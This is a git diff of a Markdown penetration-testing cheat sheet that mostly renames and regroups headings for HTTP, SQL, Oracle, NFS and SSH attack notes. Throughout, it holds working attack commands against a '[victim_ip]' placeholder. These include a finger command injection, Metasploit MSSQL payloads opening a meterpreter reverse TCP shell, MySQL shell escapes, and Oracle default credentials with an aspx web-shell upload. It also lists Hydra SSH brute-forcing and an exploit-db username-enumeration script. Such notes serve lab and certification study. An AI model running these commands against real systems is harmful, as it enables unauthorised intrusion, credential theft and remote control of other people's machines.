@@ -20,10 +20,27 @@
   - [finger comandline](#finger_comandline)
   - []()
 - [HTTP](#HTTP)
+  - [Directory scanning](#Directory_scanning)
+  - [Subdomain_scanning](#Subdomain_scanning)
+  - [Nikto scan](#Nikto_scan)
+  - [WhatWeb](#WhatWeb)
+  - [Cewl](#Cewl)
 - [SQL](#SQL)
+  - [sql nmap scan](#sql_nmap_scan
+  - [sql metasploit](#sql_metasploit)
+  - [mysql commands](#mysql_commands)
+  - [mssql server config file](#mssql_server_config_file)
 - [ORACLE](#Oracle)
 - [NFS](#NFS)
+  - [Basic NFS command](#Basic_command)
+  - [Create temp folder](#Create_temp_folder)
+  - [mount](#mount)
+  - [nmap scan](#nmap_scan)
 - [SSH](#SSH)
+  - [SSH metasploit enum](#SSH_metasploit_enum)
+  - [SSH bruteforce(#SSH_bruteforce)
+  - [SSH CVE 1](#SSH_CVE_1)
+  - [SSH CVE 2](#SSH_CVE_2)
 - [RDP](#RDP)
   - [Connect to RPD](connect_RDP)
   - [nmap rdp scan](nmap_rdp_scan])
@@ -218,7 +235,7 @@ finger "|/bin/ls -a /@[victim_ip]"
 --------------------------------------------------------------------------------------------------------------------------------
 # HTTP 
 
-## Directory scanning
+## Directory_scanning
 - dir mode
   - gobuster dir -u https://10.10.1.x -w ~/wordlists/shortlist.txt
 - dns mode
@@ -236,11 +253,13 @@ finger "|/bin/ls -a /@[victim_ip]"
   - gobuster dir -u https://10.10.1.x -w ~/wordlists/shortlist.txt -o output.txt
 - proxy chain
   -  gobuster -o gobuster.txt -e -u http://10.11.1.x/ -w ~/wordlist/shortlist.txt
-  
-## Nikto scan
-- nikto -h [victim_ip]
-- nikto -Display V -h [victim_ip]
-- nikto -Display V -o results.html -Format htm -h [victim_ip]
+
+## Subdomain_scanning
+
+## Nikto_scan
+nikto -h [victim_ip]
+nikto -Display V -h [victim_ip]
+nikto -Display V -o results.html -Format htm -h [victim_ip]
 ```
 0 – File Upload
 1 – Interesting File / Seen in logs
@@ -256,46 +275,51 @@ a – Authentication Bypass
 b – Software Identification
 c – Remote Source Inclusion
 x – Reverse Tuning Options (i.e., include all except specified)
-```
-## Only number 9 - SQL injection
-```
-nikto -Tuning 9 -h [victim_ip]6
-```
 
+example: nikto -Tuning 9 -h [victim_ip]6
+```
 ## Everything except number 6 - DOS
 ```
 nikto -Tuning x 6 -h [victim_ip]
 ```
-
 ## WhatWeb
 **Another enum type tool like nikto but looks to be more advanced and prettier in output**
-- whatweb -v -a 4 http://[victim_ip]
+```
+whatweb -v -a 4 http://[victim_ip]
+```
 
 ## Cewl
-- create dict via https://tools.kali.org/password-attacks/cewl and use as dirb list scan
+```
+create dict via https://tools.kali.org/password-attacks/cewl and use as dirb list scan
+```
+
 --------------------------------------------------------------------------------------------------------------------------------
 ## SQL
 
-#### nmap 
+## sql_nmap_scan 
 - nmap -sV -Pn -vv --script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 [victim_ip] -p 3306
 - nmap -sV -Pn -vv -script=mysql* [victim_ip] -p 3306
 - nmap -sU --script=ms-sql-info [vicrim_ip] -p 3306
 
-#### metasploit
-- msf > use auxiliary/scanner/mssql/mssql_ping
-- msf> use auxiliary/scanner/mssql/mssql_login
-- msf> use exploit/windows/mssql/mssql_payload
-  - set PAYLOAD windows/meterpreter/reverse_tcp
+## sql_metasploit
+```
+  msf > use auxiliary/scanner/mssql/mssql_ping
+  msf> use auxiliary/scanner/mssql/mssql_login
+  msf> use exploit/windows/mssql/mssql_payload
+  set PAYLOAD windows/meterpreter/reverse_tcp
 
-#### Run commands via mysql
-- mysql> select do_system('id');
-- mysql> \! sh
+Gain shell using gathered credentials
+  msf > use exploit/windows/mssql/mssql_payload
+  msf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp
+```
 
-##### Gain shell using gathered credentials
-- msf > use exploit/windows/mssql/mssql_payload
-- msf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp
+## mysql_commands
+```
+mysql> select do_system('id');
+mysql> \! sh
+```
 
-#### mssql server config file
+#### mssql_erver_config_file
 ```
 cat freetds.conf
 
@@ -309,12 +333,12 @@ root@kali:~/dirsearch# sqsh -S someserver -U sa -P PASS -D DB_NAME
 --------------------------------------------------------------------------------------------------------------------------------
 # Oracle
 
-#### Service on port 1521 
+## Service on port 1521 
  
 - Usefull tool set
 - https://www.oracle.com/pl/database/technologies/instant-client/winx64-64-downloads.html
 --------------------------------------------------------------------------------------------------------------------------------------------------------------
-#### Identify SIDs
+## Identify SIDs
 
 Identify SIDs via odat.py tool
 ```
@@ -329,7 +353,7 @@ msf auxiliary(admin/oracle/sid_brute) > set rhost <victim_ip>
 msf auxiliary(admin/oracle/sid_brute) > run
 ```
 
-#### Brute force credentials 
+## Brute force credentials 
 
 Brute force credentials via metasploit
 ```
@@ -341,13 +365,13 @@ msf auxiliary(admin/oracle/oracle_login) > run
 Get credentials with other way
 #TODO!
 
-#### Check options with odat
+## Check options with odat
 ```
 odat all -s <victim_ip> -d XE -U scott -P tiger --sysdba
 ```
 **For exmaple search DBMS_XSLPROCESSOR library(this options allows us to put any files onto the machine**
 
-#### PUT aspx file in the machine
+## PUT aspx file in the machine
 
 Generate payload
 ```
@@ -362,60 +386,52 @@ C://inetpub//wwwroot// : victim path, example for this case
 t.aspx: example shell name
 XE: example SIDs
 ```
-
-#### Port 2100
+## Port 2100
 ```
 credentials:
 sys:sys
 scott:tiger
 ```
-
-### resources
-- https://www.blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf
 --------------------------------------------------------------------------------------------------------------------------------------
 # NFS
 - The Network File System (NFS) is a client/server application that lets a computer user view and optionally store and update files on a remote computer as though they were on the user's own computer. The NFS protocol is one of several distributed file system standards for network-attached storage (NAS).
 
 
-#### Basic Command
+## Basic_command
 - showmount [ip]
 
-- create temp local folder
+## Create_temp_folder
 ```
 mkdir /tmp/nfs
 ```
-- mount
+## mount
 ```
 mount -t nfs [ip]:/home/vulnix /tmp/nfs -nolock
 ```
 
-#### nmap 
+## nmap_scan 
 ```
 nmap -sV --script=nfs-showmount [victim_ip]
 ```
 --------------------------------------------------------------------------------------------------------------------------------------
 # SSH 
 
-#### With metasploit
+## SSH_metasploit_enum
 ```
 use auxiliary/scanner/ssh/ssh_enumusers
 set user_file /usr/share/wordlists/metasploit/unix_users.txt or set user_file /usr/share/seclists/Usernames/Names/names.txt
 run
 ```
-
-#### Bruteforce with hydra
+## SSH_bruteforce
+```
 hydra -v -V -l root -P password-file.txt [victim_ip] ssh
 hydra -v -V -L user.txt -P /usr/share/wordlists/rockyou.txt -t 16 [victim_ip] ssh
+```
 
-#### User name enumeration against SSH daemons affected by CVE-2016-6210.
+## SSH_CVE_1
 - https://github.com/offensive-security/exploitdb/blob/master/exploits/linux/remote/40136.py
 
-##### searchsploit
-python /usr/share/exploitdb/exploits/linux/remote/40136.py -U /usr/share/wordlists/metasploit/unix_users.txt [victim_ip]
-
-### usefull flag: -e nsr
-
-##### ssh CVE (CVE-2008-0166)
+## SSH_CVE_2
 - https://github.com/g0tmi1k/debian-ssh
 --------------------------------------------------------------------------------------------------------------------------------------
 # RDP
